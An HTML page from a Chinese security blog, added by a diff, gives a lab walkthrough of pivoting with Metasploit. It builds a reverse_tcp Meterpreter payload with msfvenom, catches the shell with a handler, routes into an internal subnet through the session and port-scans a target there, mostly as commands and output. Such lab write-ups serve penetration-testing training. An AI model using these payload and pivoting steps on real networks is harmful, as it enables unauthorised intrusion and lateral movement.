@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="幻心">
+
+
+
+
+
+<title>Metasploit跨网段攻击添加路由表 | 幻心&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">幻心&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">幻心&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Metasploit跨网段攻击添加路由表</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">幻心</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 13, 2020&nbsp;&nbsp;20:00:28</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>Mac【Metasploit】：192.168.43.100</p>
+<p>Win7【跳板机】：192.168.215.144【Nat】、172.16.63.128【仅主机】</p>
+<p>Linux【目标机】：172.16.63.129【仅主机】，开启80端口方便检测验证</p>
+<p><img src="../img/Metasploit%E8%B7%A8%E7%BD%91%E6%AE%B5%E6%94%BB%E5%87%BB%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E8%A1%A8.assets/image-20200213212856705.png" alt="image-20200213212856705"></p>
+<p>实际场景：当获得一台跳板机的权限后，如何针对其内网进行渗透；</p>
+<p>这种场景可利用手段很多，各种转发代理进内网工具数不胜数…</p>
+<p>这里利用 <code>Metasploit 添加路由表</code> 来跨网段攻击；</p>
+<h2 id="脚本-autoroute"><a href="#脚本-autoroute" class="headerlink" title="脚本 autoroute"></a>脚本 autoroute</h2><p>前提拿到跳板机的 Meterpreter shell；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Go0s]: ~ </span><br><span class="line">➜  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f exe -o ~/Desktop/shell.exe</span><br><span class="line">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">No Arch selected, selecting Arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 333 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">Saved as: /Users/go0s/Desktop/shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>这里直接在跳板机运行上线；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.43.100</span><br><span class="line">lhost =&gt; 192.168.43.100</span><br><span class="line">msf exploit(handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.43.100:4444 </span><br><span class="line">[*] Sending stage (179267 bytes) to 192.168.43.100</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.43.100:4444 -&gt; 192.168.43.100:59135) at 2018-01-06 19:48:56 +0800</span><br></pre></td></tr></table></figure>
+
+<p>先查看跳板机处于哪几个网段中，使用 <code>get_local_subnets</code> 脚本；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: 172.16.63.0/255.255.255.0</span><br><span class="line">Local subnet: 192.168.215.0/255.255.255.0</span><br></pre></td></tr></table></figure>
+
+<p>结果如期；</p>
+<p>直接将内网网段172.16.63.0/24添加至路由表，使用 <code>autoroute</code> 脚本；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 172.16.63.0/24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route to 172.16.63.0/255.255.255.0...</span><br><span class="line">[+] Added route to 172.16.63.0/255.255.255.0 via 192.168.43.100</span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure>
+
+<p>将session退出至后台，使用 <code>route print</code> 查看路由表映射情况；</p>
+<p>可以看出网关Gateway是Meterpreter shell的session，即跳板机；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(handler) &gt; route print </span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   172.16.63.0        255.255.255.0      Session 1</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br></pre></td></tr></table></figure>
+
+<p>使用端口扫描模块验证目标机80端口；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf auxiliary(tcp) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/tcp):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   CONCURRENCY  10               yes       The number of concurrent ports to check per host</span><br><span class="line">   DELAY        0                yes       The delay between connections, per thread, in milliseconds</span><br><span class="line">   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.</span><br><span class="line">   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)</span><br><span class="line">   RHOSTS                        yes       The target address range or CIDR identifier</span><br><span class="line">   THREADS      1                yes       The number of concurrent threads</span><br><span class="line">   TIMEOUT      1000             yes       The socket connect timeout in milliseconds</span><br><span class="line"></span><br><span class="line">msf auxiliary(tcp) &gt; set rhosts 172.16.63.129</span><br><span class="line">rhosts =&gt; 172.16.63.129</span><br><span class="line">msf auxiliary(tcp) &gt; set ports 80</span><br><span class="line">ports =&gt; 80</span><br><span class="line">msf auxiliary(tcp) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 172.16.63.129:        - 172.16.63.129:80 - TCP OPEN</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<p>路由成功，使用MSF成功检测【攻击】内网目标机；</p>
+<p>但是它有弊端，如果子网太大可能会将本机的数据包广播出去，所以最好看一下子网大小，使用手动添加路由；</p>
+<h2 id="手工设置路由表"><a href="#手工设置路由表" class="headerlink" title="手工设置路由表"></a>手工设置路由表</h2><p>即代替上种方法中的 <code>autoroute</code> 脚本；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">查看跳板机所处网段：</span><br><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: 172.16.63.0/255.255.255.0</span><br><span class="line">Local subnet: 192.168.215.0/255.255.255.0</span><br><span class="line"></span><br><span class="line">将运行着的session退至后台：</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line"></span><br><span class="line">添加路由：</span><br><span class="line">msf exploit(handler) &gt; route add 172.16.63.0 255.255.255.0 1</span><br><span class="line">[*] Route added</span><br><span class="line">msf exploit(handler) &gt; route print</span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   172.16.63.0        255.255.255.0      Session 1</span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br></pre></td></tr></table></figure>
+
+<h2 id="诟病"><a href="#诟病" class="headerlink" title="诟病"></a>诟病</h2><p>本机Metasploit使用【手工设置路由表】设置路由后，竟然同步到了本机上，造成本机直接可以访问目标机…</p>
+<p>原因很简单，MSF界面使用命令作用于本机…这里首推使用脚本来添加；</p>
+<p>删除本条路由，需要root权限；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[Go0s]: ~ </span><br><span class="line">➜  netstat -nr</span><br><span class="line">Routing tables</span><br><span class="line">Internet:</span><br><span class="line">Destination        Gateway            Flags        Refs      Use   Netif Expire</span><br><span class="line">172.16.63/24       link#18            UC              2        0  vmnet1</span><br><span class="line">172.16.63.128      0:c:29:c:e1:c5     UHLWI           0       21  vmnet1    707</span><br><span class="line">172.16.63.129      0:c:29:f1:8c:aa    UHLWIi          1     1528  vmnet1   1184</span><br><span class="line"></span><br><span class="line">[Go0s]: ~ </span><br><span class="line">➜  sudo route delete 172.16.63/24    </span><br><span class="line">delete net 172.16.63</span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>幻心</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://huanxinhack.github.io/metasploit%E8%B7%A8%E7%BD%91%E6%AE%B5%E6%94%BB%E5%87%BB%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E8%A1%A8/">http://huanxinhack.github.io/metasploit%E8%B7%A8%E7%BD%91%E6%AE%B5%E6%94%BB%E5%87%BB%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E8%A1%A8/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Metasploit/"># Metasploit</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/msfvenom%E5%B8%B8%E7%94%A8payload%E5%91%BD%E4%BB%A4/">msfvenom常用payload命令</a>
+            
+            
+            <a class="next" rel="next" href="/linux-%E5%8F%8D%E5%BC%B9-shell/">Linux 反弹 Shell</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© 幻心 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
